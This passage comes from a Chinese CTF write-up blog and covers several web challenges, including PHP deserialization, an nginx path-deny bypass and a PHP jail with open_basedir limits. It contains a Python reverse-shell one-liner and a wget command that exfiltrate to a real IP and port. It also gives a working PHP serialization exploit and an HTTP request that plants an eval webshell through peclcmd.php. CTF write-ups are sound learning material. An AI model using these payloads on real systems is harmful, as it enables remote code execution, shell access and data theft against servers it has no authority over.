class="hljs-string">&quot;utf-8&quot;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">server_class=HTTPServer, handler_class=JSONRequestHandler, port=<span class="hljs-number">7777</span></span>):<br>    server_address = (<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port)<br>    httpd = server_class(server_address, handler_class)<br>    httpd.serve_forever()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    run()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226204742825.png" srcset="/img/loading.gif" lazyload alt="image-20260226204742825"></p>
+<p>下面的命令执行没有回显，可以反弹shell或者外带数据</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -c &#x27;import os,pty,socket;s=socket.socket();s.connect((<span class="hljs-string">&quot;183.66.27.22&quot;</span>,<span class="hljs-number">18546</span>));[os.dup2(s.fileno(),f)for f in(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.spawn(<span class="hljs-string">&quot;sh&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226204835508.png" srcset="/img/loading.gif" lazyload alt="image-20260226204835508"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> http://<span class="hljs-number">183.66</span>.<span class="hljs-number">27.22</span>:<span class="hljs-number">18546</span>/<span class="hljs-variable">$</span>(<span class="hljs-built_in">cat</span> /flag)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260226205029809.png" srcset="/img/loading.gif" lazyload alt="image-20260226205029809"></p>
+<h2 id="Your-Uns3r"><a href="#Your-Uns3r" class="headerlink" title="Your Uns3r"></a>Your Uns3r</h2><p>！新春杯ez_uns原来是从这里来的</p>
+<p>不过看了出题人的wp，升级后的题目有几个WAF绕过的手法还真没见过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;value, <span class="hljs-string">&#x27;S:&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;value));<br>            <span class="hljs-variable">$instance</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ser</span> != <span class="hljs-variable language_">$this</span>-&gt;value &amp;&amp; <span class="hljs-variable">$instance</span> <span class="hljs-keyword">instanceof</span> Access) &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-variable">$instance</span>-&gt;<span class="hljs-title function_ invoke__">getToken</span>());<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;wanna ?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Access</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$prefix</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$suffix</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getToken</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;prefix) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;suffix)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Go to HELL!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;prefix . <span class="hljs-string">&#x27;lilctf&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;suffix . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$result</span>, <span class="hljs-string">&#x27;pearcmd&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Can I have peachcmd?&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;admin&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;Access&quot;:&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span> (<span class="hljs-string">&quot;no way!!!!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>首先是admin变成了强比较不能用true或者0来绕过检查了，那就只能用大写+十六进制</p>
+<p>同时类名不能是Access（也不能用小写绕过检查），结合下面的反序列化再序列化，可以用<code>__PHP_Incomplete_Class_Name</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.php-incomplete-class.php">PHP: __PHP_Incomplete_Class - Manual</a></p>
+<p>反序列化一个不存在的类来让作为 <code>__PHP_Incomplete_Class_Name</code> 的成员变为类名, 这样也会让两次反序列化结果不一致</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;prefix . <span class="hljs-string">&#x27;lilctf&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;suffix . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>include这里也做了限制，只能是php文件，这里了解一下pearcmd.php</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung/articles/18220835">关于pearcmd.php的利用 - Yuy0ung - 博客园</a></p>
+<p>这里pearcmd被禁了，我们找它的平替peclcmd.php</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Access</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&#x27;/usr/local/lib/&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&#x27;/../php/peclcmd.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$token</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Access</span>();<br><span class="hljs-variable">$user</span>-&gt;username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$token</span>);<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;Access&quot;:2&#x27;</span>, <span class="hljs-string">&#x27;LilRan&quot;:3&#x27;</span>, <span class="hljs-variable">$ser</span>);<br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);<br><span class="hljs-variable">$ser</span> .= <span class="hljs-string">&#x27;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:6:&quot;Access&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$user</span>-&gt;value = <span class="hljs-variable">$ser</span>;<br><span class="hljs-variable">$userser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-variable">$userser</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;s:5:&quot;admin&quot;&#x27;</span>, <span class="hljs-string">&#x27;;S:5:&quot;\61dmin&quot;&#x27;</span>, <span class="hljs-variable">$userser</span>);<br><span class="hljs-variable">$fin</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$userser</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$fin</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>构造请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?+config-create+/&lt;?=eval($_POST[0])?&gt;+/var/www/html/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.imxbt.cn:31707<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-mel">user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22%5C61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22LilRan%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&amp;<span class="hljs-number">0</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>);</span><br></code></pre></td></tr></table></figure>
+
+<p>这里注意用bp发送请求，hack的话会自动url编码php标识</p>
+<h2 id="接力！TurboFlash"><a href="#接力！TurboFlash" class="headerlink" title="接力！TurboFlash"></a>接力！TurboFlash</h2><p>访问&#x2F;sercret就可以获得flag，但是Nginx 会屏蔽 <code>/secret</code> 和 <code>/secret/</code> 后接任意路径的请求</p>
+<p>这里找到了 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14403">nginx deny限制路径绕过-先知社区</a></p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260228145801578.png" srcset="/img/loading.gif" lazyload alt="image-20260228145801578"></p>
+<h2 id="php-jail-is-my-cry"><a href="#php-jail-is-my-cry" class="headerlink" title="php_jail_is_my_cry"></a>php_jail_is_my_cry</h2><p>这下真是cry了，调了一下午+一晚上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$url</span>);<br>    <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;/tmp/&#x27;</span>.<span class="hljs-variable">$file_name</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件已下载: &lt;a href=&#x27;?down=<span class="hljs-subst">$file_name</span>&#x27;&gt;<span class="hljs-subst">$file_name</span>&lt;/a&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下载失败。&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;down&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;down&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-comment">// 上传文件</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$orig</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-string">&#x27;file://&#x27;</span>. <span class="hljs-variable">$orig</span>);<br>    <br>    <span class="hljs-comment">// I hide a trick to bypass open_basedir, I&#x27;m sure you can find it.</span><br><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&lt;?&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;php&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;halt&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$target_file</span>, <span class="hljs-variable">$data</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;存在 `&lt;?` 或者 `php` 或者 `halt` 恶意字符!&quot;</span>;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>上传文件又有include所以可以打phar <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18584">php 文件上传不含一句 php 代码 RCE 最新新姿势-先知社区</a></p>
+<p>看一眼php.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 。。。">open_basedir = /var/www/html:/tmp<br>disable_functions=太多了。。。<br></code></pre></td></tr></table></figure>
+
+<p>这里找到一个脚本可以看看还有什么函数可用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 用户提供的禁用函数列表（此处为简化示例，实际需替换为完整列表）</span><br><span class="hljs-variable">$disabledFunctions</span> = [<br>   <span class="hljs-string">&#x27;zend_version&#x27;</span>,<br> <span class="hljs-string">&#x27;func_num_args&#x27;</span>,<br> <span class="hljs-string">&#x27;func_get_arg&#x27;</span>,<br> <span class="hljs-string">&#x27;func_get_args&#x27;</span>,<br> <span class="hljs-string">&#x27;strlen&#x27;</span>,<br> <span class="hljs-string">&#x27;strcmp&#x27;</span>,<br> <span class="hljs-string">&#x27;strncmp&#x27;</span>,<br> <span class="hljs-string">&#x27;strcasecmp&#x27;</span>,<br> <span class="hljs-string">&#x27;strncasecmp&#x27;</span>,<br> <span class="hljs-string">&#x27;each&#x27;</span>,<br> <span class="hljs-string">&#x27;error_reporting&#x27;</span>,<br> <span class="hljs-string">&#x27;define&#x27;</span>,<br>];<br><span class="hljs-comment">//由于篇幅问题这里不给全禁用函数，自行php.ini获取即可</span><br><br><span class="hljs-comment">// 获取所有内置函数并分类</span><br><span class="hljs-variable">$allFunctions</span> = <span class="hljs-title function_ invoke__">get_defined_functions</span>();<br><span class="hljs-variable">$internalFunctions</span> = <span class="hljs-variable">$allFunctions</span>[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><span class="hljs-variable">$userFunctions</span> = <span class="hljs-variable">$allFunctions</span>[<span class="hljs-string">&#x27;user&#x27;</span>]; <span class="hljs-comment">// 通常为空</span><br><br><span class="hljs-comment">// 筛选未禁用的函数</span><br><span class="hljs-variable">$availableFunctions</span> = <span class="hljs-title function_ invoke__">array_diff</span>(<span class="hljs-variable">$internalFunctions</span>, <span class="hljs-variable">$disabledFunctions</span>);<br><br><span class="hljs-comment">// 验证函数实际可用性</span><br><span class="hljs-variable">$verifiedFunctions</span> = [];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$availableFunctions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$func</span>)) &#123;<br>        <span class="hljs-comment">// 分类：普通函数 vs 面向对象函数（根据命名特征）</span><br>        <span class="hljs-variable">$type</span> = (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$func</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z]+_[a-z]/&#x27;</span>, <span class="hljs-variable">$func</span>)) <br>                ? <span class="hljs-string">&#x27;普通函数&#x27;</span> : <span class="hljs-string">&#x27;面向对象函数&#x27;</span>;<br>        <span class="hljs-variable">$verifiedFunctions</span>[<span class="hljs-variable">$type</span>][] = <span class="hljs-variable">$func</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP可用函数检测报告&lt;/title&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;style&gt;</span><br><span class="hljs-string">    body &#123; font-family: sans-serif; margin: 20px; &#125;</span><br><span class="hljs-string">    table &#123; border-collapse: collapse; width: 100%; margin-bottom: 30px; &#125;</span><br><span class="hljs-string">    th, td &#123; border: 1px solid #ddd; padding: 8px; text-align: left; &#125;</span><br><span class="hljs-string">    th &#123; background-color: #f2f2f2; &#125;</span><br><span class="hljs-string">    h2 &#123; color: #2c3e50; &#125;</span><br><span class="hljs-string">    .count &#123; background-color: #e74c3c; color: white; padding: 2px 8px; border-radius: 10px; &#125;</span><br><span class="hljs-string">&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$verifiedFunctions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$type</span> =&gt; <span class="hljs-variable">$functions</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;<span class="hljs-subst">&#123;$type&#125;</span> (&lt;span class=&#x27;count&#x27;&gt;&quot;</span> . <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$functions</span>) . <span class="hljs-string">&quot;&lt;/span&gt;)&lt;/h2&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;table&gt;&lt;tr&gt;&lt;th&gt;函数名&lt;/th&gt;&lt;th&gt;类型&lt;/th&gt;&lt;/tr&gt;&quot;</span>;<br>    <span class="hljs-variable">$chunked</span> = <span class="hljs-title function_ invoke__">array_chunk</span>(<span class="hljs-variable">$functions</span>, <span class="hljs-number">5</span>); <span class="hljs-comment">// 每行5个函数</span><br>    <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$chunked</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;code&gt;<span class="hljs-subst">$func</span>&lt;/code&gt;&lt;/td&gt;&lt;td&gt;<span class="hljs-subst">&#123;$type&#125;</span>&lt;/td&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">// 补全表格单元格</span><br>        <span class="hljs-variable">$missingCells</span> = <span class="hljs-number">5</span> - <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$row</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$missingCells</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br>&#125;<br><br><span 